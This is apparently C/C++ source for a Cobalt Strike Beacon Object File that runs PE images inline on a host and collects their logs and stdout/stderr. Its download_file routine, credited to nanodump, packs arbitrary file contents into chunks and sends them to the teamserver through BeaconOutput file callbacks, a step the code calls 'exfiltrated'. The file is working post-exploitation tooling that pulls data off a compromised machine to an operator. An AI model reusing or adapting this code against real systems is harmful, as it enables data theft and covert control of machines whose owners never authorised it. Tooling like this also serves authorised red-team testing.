extern "C" {
// clang-format off
#include "inlinecommon.h"
// clang-format on

#include <time.h>

#include "globalshareddata.cc"
#include "hooks/simplelist1.cc"
#include "jobs1.cc"

#ifdef BOF
// https://github.com/fortra/nanodump/blob/450d5b23aeba5e0f8f6e5fc826a08997b2237be9/source/utils.c#L639
#define CALLBACK_FILE 0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09

BOOL download_file(IN DWORD chunk_size, IN LPCSTR fileName, IN char fileData[],
                   IN ULONG32 fileLength) {
  int fileNameLength = (int)strnlen(fileName, 256);

  // intializes the random number generator
  time_t t;
  srand((unsigned)time(&t));

  // generate a 4 byte random id, rand max value is 0x7fff
  ULONG32 fileId = 0;
  fileId |= (rand() & 0x7FFF) << 0x11;
  fileId |= (rand() & 0x7FFF) << 0x02;
  fileId |= (rand() & 0x0003) << 0x00;

  // 8 bytes for fileId and fileLength
  int messageLength = 8 + fileNameLength;
  char *packedData = (char *)malloc(messageLength);
  if (!packedData) {
    PRINTF_ERR("Could download the file %s", fileName);
    return FALSE;
  }

  // pack on fileId as 4-byte int first
  packedData[0] = (fileId >> 0x18) & 0xFF;
  packedData[1] = (fileId >> 0x10) & 0xFF;
  packedData[2] = (fileId >> 0x08) & 0xFF;
  packedData[3] = (fileId >> 0x00) & 0xFF;

  // pack on fileLength as 4-byte int second
  packedData[4] = (fileLength >> 0x18) & 0xFF;
  packedData[5] = (fileLength >> 0x10) & 0xFF;
  packedData[6] = (fileLength >> 0x08) & 0xFF;
  packedData[7] = (fileLength >> 0x00) & 0xFF;

  // pack on the file name last
  for (int i = 0; i < fileNameLength; i++) {
    packedData[8 + i] = fileName[i];
  }

  // tell the teamserver that we want to download a file
  BeaconOutput(CALLBACK_FILE, packedData, messageLength);
  free(packedData);

  // we use the same memory region for all chucks
  int chunkLength = 4 + chunk_size;
  char *packedChunk = (char *)malloc(chunkLength);
  if (!packedChunk) {
    PRINTF_ERR("Could download the file %s", fileName);
    return FALSE;
  }
  // the fileId is the same for all chunks
  packedChunk[0] = (fileId >> 0x18) & 0xFF;
  packedChunk[1] = (fileId >> 0x10) & 0xFF;
  packedChunk[2] = (fileId >> 0x08) & 0xFF;
  packedChunk[3] = (fileId >> 0x00) & 0xFF;

  ULONG32 exfiltrated = 0;
  while (exfiltrated < fileLength) {
    // send the file content by chunks
    chunkLength = fileLength - exfiltrated > chunk_size
                      ? chunk_size
                      : fileLength - exfiltrated;
    ULONG32 chunkIndex = 4;
    for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
      packedChunk[chunkIndex++] = fileData[i];
    }
    // send a chunk
    BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
    exfiltrated += chunkLength;
  }
  free(packedChunk);

  // tell the teamserver that we are done writing to this fileId
  char packedClose[4];
  packedClose[0] = (fileId >> 0x18) & 0xFF;
  packedClose[1] = (fileId >> 0x10) & 0xFF;
  packedClose[2] = (fileId >> 0x08) & 0xFF;
  packedClose[3] = (fileId >> 0x00) & 0xFF;
  BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
  PRINTF("The file %s was downloaded filessly", fileName);
  return TRUE;
}

BOOL DownloadFile(LPCWSTR filePath, PVOID data, DWORD size) {
  LPCWSTR fileNameW = wcsrchr(filePath, L'\\');
  if (!fileNameW) {
    PRINTF_ERR("Could not extract the file name from %ws", filePath);
    return FALSE;
  }
  fileNameW += 1;
  char fileNameA[MAX_PATH];
  if (!WideCharToMultiByte(CP_ACP, 0, fileNameW, -1, fileNameA, MAX_PATH, NULL,
                           NULL)) {
    PRINTF_ERR("Could not convert the file name to ANSI");
    return FALSE;
  }
  // by default, the chunk size is 900 KiB
  return download_file(0xe1000, fileNameA, (char *)data, size);
}
#else
BOOL DownloadFile(LPCWSTR filePath, PVOID data, DWORD size) {
  LPCWSTR fileNameW = wcsrchr(filePath, L'\\');
  if (!fileNameW) {
    PRINTF_ERR("Could not extract the file name from %ws", filePath);
    return FALSE;
  }
  fileNameW += 1;
  WCHAR fileName[MAX_PATH] = L"vfo_";
  wcscat(fileName, fileNameW);
  FILE *f = _wfopen(fileName, L"wb");
  if (!f) {
    PRINTF_ERR("Could not open the file %ws", fileName);
    return FALSE;
  }
  BOOL b = fwrite(data, 1, size, f) == size;
  fclose(f);
  if (!b) {
    PRINTF_ERR("Could not write to the file %ws", fileName);
    return FALSE;
  }
  return TRUE;
}
#endif

void InlineLogPE(void *imageBase) {
  TRACEF("Begin fetch log.");

  GlobalSharedData *data = NULL;
  int index = 0;
  LoadedPEImage *peImage = NULL;
  JobEntry **jobList = NULL;
  int jobId = 0;
  HookOutput *output = NULL;

  data = GetGlobalSharedData();
  if (!imageBase) {
    imageBase = data->LastImageBase;
    PRINTF("Use the last image base %p.", imageBase);
  }
  if (!imageBase) {
    PRINTF_ERR("The image base is NULL.");
    goto out;
  }
  for (index = 0; index < LoadedPEImageMax; index++) {
    if (data->PEImages[index].ImageBase == imageBase) {
      break;
    }
  }
  if (index == LoadedPEImageMax) {
    PRINTF_ERR("Can't find %p in PEImages.", imageBase);
    goto out;
  }
  peImage = &data->PEImages[index];
  jobList = (JobEntry **)peImage->JobList;
  jobId = peImage->JobId;
  output = peImage->Output;

  TRACEF("1. Print async log");

  SpinLock(output->LogLock, {
    SimpleListForEach(&output->Logs, LogEntry, log, {
      if (!log->Text) {
        continue;
      }
      _BeaconPrint(log->Type, "%.*s", log->Size, log->Text);
      free(log->Text);
      log->Text = NULL;
      // TODO: Trim list?
    });
  });

  if (peImage->IsRunning) {
    PRINTF("The PE image %p is still running.", imageBase);
    goto out;
  }

  TRACEF("2. Print stdout/stderr");

  if (output->Stdout) {
    if (output->Stdout->Size) {
      _BeaconPrint(output->Type, "Stdout: %.*s", output->Stdout->Size,
                   (char *)output->Stdout->Buffer);
    }
    SimpleListFree(output->Stdout);
    free(output->Stdout);
  }
  if (output->Stderr) {
    if (output->Stderr->Size) {
      _BeaconPrint(output->Type, "Stderr: %.*s", output->Stderr->Size,
                   (char *)output->Stderr->Buffer);
    }
    SimpleListFree(output->Stderr);
    free(output->Stderr);
  }
  SimpleListFree(&output->Logs);
  free(output);
  if (jobList) {
    SimpleRemoveJob(jobList, jobId);
    TRACEF("Job %d was removed.", jobId);
  }
  free(peImage->CommandLineA);

  TRACEF("3. Download virtual files");

  for (DWORD i = 0; i < peImage->VirtualFileCount; i++) {
    HookVirtualFile *file = &peImage->VirtualFiles[i];
    PRINTF("Downloading virtual file %ws (%d bytes).", file->FileName,
           file->Data.Size);
    DownloadFile(file->FileName, file->Data.Buffer, file->Data.Size);
    SimpleListFree(&file->Data);
  }
  if (peImage->VirtualFiles) free(peImage->VirtualFiles);

  TRACEF("4. Remove PE image");

  *peImage = {};
  TRACEF("PE image %p was removed from global shared data.", imageBase);

out:
  TRACEF("End fetch log.");
}

#ifdef BOF
void go(char *argv, int argc) {
  // Parse arguments
  datap parser;
  BeaconDataParse(&parser, argv, argc);
  int imageBaseStrSize = 0;
  char *imageBaseStr = BeaconDataExtract(&parser, &imageBaseStrSize);
  void *imageBase = (void *)(size_t)_strtoui64(imageBaseStr, NULL, 16);
  TRACEF("Arguments was parsed. (imageBase: %p)", imageBase);

  InlineLogPE(imageBase);
}
#endif
}
